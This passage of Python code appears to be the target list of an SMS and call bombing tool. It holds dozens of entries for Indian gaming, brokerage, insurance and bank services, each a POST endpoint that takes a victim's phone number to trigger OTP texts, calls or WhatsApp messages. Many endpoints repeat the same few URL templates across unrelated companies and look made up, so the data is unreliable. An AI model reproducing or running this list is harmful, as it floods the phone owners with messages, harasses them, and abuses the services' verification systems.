    {"name": "SquareYards SMS", "url": "https://www.squareyards.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "SquareYards Call", "url": "https://squareyards.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "SquareYards WhatsApp", "url": "https://squareyards.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    # ==============================================================================
    # 🎮 GAMING
    # ==============================================================================
    
    {"name": "PokerBaazi SMS", "url": "https://www.pokerbaazi.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "PokerBaazi Call", "url": "https://pokerbaazi.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "PokerBaazi WhatsApp", "url": "https://pokerbaazi.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "My11Circle SMS", "url": "https://www.my11circle.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "My11Circle Call", "url": "https://my11circle.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "My11Circle WhatsApp", "url": "https://my11circle.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Dream11 SMS", "url": "https://www.dream11.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Dream11 Call", "url": "https://dream11.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Dream11 WhatsApp", "url": "https://dream11.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "MPL SMS", "url": "https://www.mpl.live/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "MPL Call", "url": "https://mpl.live/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "MPL WhatsApp", "url": "https://mpl.live/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Paytm First Games SMS", "url": "https://firstgames.paytm.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Paytm First Games Call", "url": "https://firstgames.paytm.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Paytm First Games WhatsApp", "url": "https://firstgames.paytm.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Adda52 SMS", "url": "https://www.adda52.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Adda52 Call", "url": "https://adda52.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Adda52 WhatsApp", "url": "https://adda52.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "RummyCircle SMS", "url": "https://www.rummycircle.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "RummyCircle Call", "url": "https://rummycircle.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "RummyCircle WhatsApp", "url": "https://rummycircle.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    # ==============================================================================
    # 💵 FINANCE / STOCKS
    # ==============================================================================
    
    {"name": "Jupiter SMS", "url": "https://jupiter.money/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    {"name": "Jupiter Call", "url": "https://jupiter.money/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Jupiter WhatsApp", "url": "https://jupiter.money/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Groww SMS", "url": "https://groww.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Groww Call", "url": "https://groww.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Groww WhatsApp", "url": "https://groww.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Zerodha SMS", "url": "https://zerodha.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Zerodha Call", "url": "https://zerodha.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Zerodha WhatsApp", "url": "https://zerodha.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Angel One SMS", "url": "https://www.angelone.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Angel One Call", "url": "https://angelone.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Angel One WhatsApp", "url": "https://angelone.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Upstox SMS", "url": "https://upstox.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Upstox Call", "url": "https://upstox.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Upstox WhatsApp", "url": "https://upstox.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "5paisa SMS", "url": "https://www.5paisa.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "5paisa Call", "url": "https://5paisa.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "5paisa WhatsApp", "url": "https://5paisa.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "ICICI Direct SMS", "url": "https://www.icicidirect.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "ICICI Direct Call", "url": "https://icicidirect.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "ICICI Direct WhatsApp", "url": "https://icicidirect.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "HDFC Securities SMS", "url": "https://www.hdfcsec.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "HDFC Securities Call", "url": "https://hdfcsec.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "HDFC Securities WhatsApp", "url": "https://hdfcsec.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Sharekhan SMS", "url": "https://www.sharekhan.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Sharekhan Call", "url": "https://sharekhan.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Sharekhan WhatsApp", "url": "https://sharekhan.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Motilal Oswal SMS", "url": "https://www.motilaloswal.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Motilal Oswal Call", "url": "https://motilaloswal.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Motilal Oswal WhatsApp", "url": "https://motilaloswal.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Kotak Securities SMS", "url": "https://www.kotaksecurities.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Kotak Securities Call", "url": "https://kotaksecurities.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Kotak Securities WhatsApp", "url": "https://kotaksecurities.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Axis Direct SMS", "url": "https://www.axisdirect.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Axis Direct Call", "url": "https://axisdirect.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Axis Direct WhatsApp", "url": "https://axisdirect.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "IIFL SMS", "url": "https://www.iifl.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "IIFL Call", "url": "https://iifl.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "IIFL WhatsApp", "url": "https://iifl.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Edelweiss SMS", "url": "https://www.edelweiss.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Edelweiss Call", "url": "https://edelweiss.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Edelweiss WhatsApp", "url": "https://edelweiss.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "JM Financial SMS", "url": "https://www.jmfinancial.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "JM Financial Call", "url": "https://jmfinancial.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "JM Financial WhatsApp", "url": "https://jmfinancial.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Anand Rathi SMS", "url": "https://www.anandrathi.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Anand Rathi Call", "url": "https://anandrathi.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Anand Rathi WhatsApp", "url": "https://anandrathi.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Geojit SMS", "url": "https://www.geojit.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Geojit Call", "url": "https://geojit.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Geojit WhatsApp", "url": "https://geojit.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    # ==============================================================================
    # 🏦 INSURANCE
    # ==============================================================================
    
    {"name": "SBI Life SMS", "url": "https://www.sbilife.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "SBI Life Call", "url": "https://sbilife.co.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "SBI Life WhatsApp", "url": "https://sbilife.co.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "HDFC Life SMS", "url": "https://www.hdfclife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "HDFC Life Call", "url": "https://hdfclife.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "HDFC Life WhatsApp", "url": "https://hdfclife.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "ICICI Prudential SMS", "url": "https://www.iciciprulife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "ICICI Prudential Call", "url": "https://iciciprulife.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "ICICI Prudential WhatsApp", "url": "https://iciciprulife.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Max Life SMS", "url": "https://www.maxlifeinsurance.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Max Life Call", "url": "https://maxlifeinsurance.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Max Life WhatsApp", "url": "https://maxlifeinsurance.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Tata AIA SMS", "url": "https://www.tataaia.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Tata AIA Call", "url": "https://tataaia.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Tata AIA WhatsApp", "url": "https://tataaia.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Bajaj Allianz SMS", "url": "https://www.bajajallianz.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Bajaj Allianz Call", "url": "https://bajajallianz.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Bajaj Allianz WhatsApp", "url": "https://bajajallianz.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Reliance Nippon SMS", "url": "https://www.reliancenipponlife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Reliance Nippon Call", "url": "https://reliancenipponlife.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Reliance Nippon WhatsApp", "url": "https://reliancenipponlife.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Aditya Birla SMS", "url": "https://lifeinsurance.adityabirlacapital.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Aditya Birla Call", "url": "https://lifeinsurance.adityabirlacapital.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Aditya Birla WhatsApp", "url": "https://lifeinsurance.adityabirlacapital.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "PNB MetLife SMS", "url": "https://www.pnbmetlife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "PNB MetLife Call", "url": "https://pnbmetlife.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "PNB MetLife WhatsApp", "url": "https://pnbmetlife.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Kotak Life SMS", "url": "https://www.kotaklife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Kotak Life Call", "url": "https://kotaklife.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Kotak Life WhatsApp", "url": "https://kotaklife.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    # ==============================================================================
    # 🏦 PAYMENTS BANKS
    # ==============================================================================
    
    {"name": "Airtel Payments Bank SMS", "url": "https://www.airtel.in/bank/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Airtel Payments Bank Call", "url": "https://airtel.in/bank/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Airtel Payments Bank WhatsApp", "url": "https://airtel.in/bank/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "India Post Payments Bank SMS", "url": "https://www.ippbonline.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "India Post Payments Bank Call", "url": "https://ippbonline.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "India Post Payments Bank WhatsApp", "url": "https://ippbonline.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Fino Payments Bank SMS", "url": "https://www.finopayments.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Fino Payments Bank Call", "url": "https://finopayments.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Fino Payments Bank WhatsApp", "url": "https://finopayments.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Jio Payments Bank SMS", "url": "https://www.jiopaymentsbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Jio Payments Bank Call", "url": "https://jiopaymentsbank.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Jio Payments Bank WhatsApp", "url": "https://jiopaymentsbank.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "NSDL Payments Bank SMS", "url": "https://www.nsdlpaymentsbank.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "NSDL Payments Bank Call", "url": "https://nsdlpaymentsbank.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "NSDL Payments Bank WhatsApp", "url": "https://nsdlpaymentsbank.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Suryoday Bank SMS", "url": "https://www.suryodaybank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Suryoday Bank Call", "url": "https://suryodaybank.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Suryoday Bank WhatsApp", "url": "https://suryodaybank.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Utkarsh Bank SMS", "url": "https://www.utkarshbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Utkarsh Bank Call", "url": "https://utkarshbank.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Utkarsh Bank WhatsApp", "url": "https://utkarshbank.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Equitas Bank SMS", "url": "https://www.equitasbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Equitas Bank Call", "url": "https://equitasbank.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Equitas Bank WhatsApp", "url": "https://equitasbank.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "City Union Bank SMS", "url": "https://www.cityunionbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "City Union Bank Call", "url": "https://cityunionbank.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "City Union Bank WhatsApp", "url": "https://cityunionbank.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "DCB Bank SMS", "url": "https://www.dcbbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "DCB Bank Call", "url": "https://dcbbank.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "DCB Bank WhatsApp", "url": "https://dcbbank.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Tamilnad Mercantile Bank SMS", "url": "https://www.tmb.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Tamilnad Mercantile Bank Call", "url": "https://tmb.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Tamilnad Mercantile Bank WhatsApp", "url": "https://tmb.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "CSB Bank SMS", "url": "https://www.csb.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "CSB Bank Call", "url": "https://csb.co.in/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "CSB Bank WhatsApp", "url": "https://csb.co.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "ESAF Bank SMS", "url": "https://www.esafbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "ESAF Bank Call", "url": "https://esafbank.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "ESAF Bank WhatsApp", "url": "https://esafbank.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Fincare Bank SMS", "url": "https://www.fincarebank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Fincare Bank Call", "url": "https://fincarebank.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Fincare Bank WhatsApp", "url": "https://fincarebank.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Jana Bank SMS", "url": "https://www.janabank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Jana Bank Call", "url": "https://janabank.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
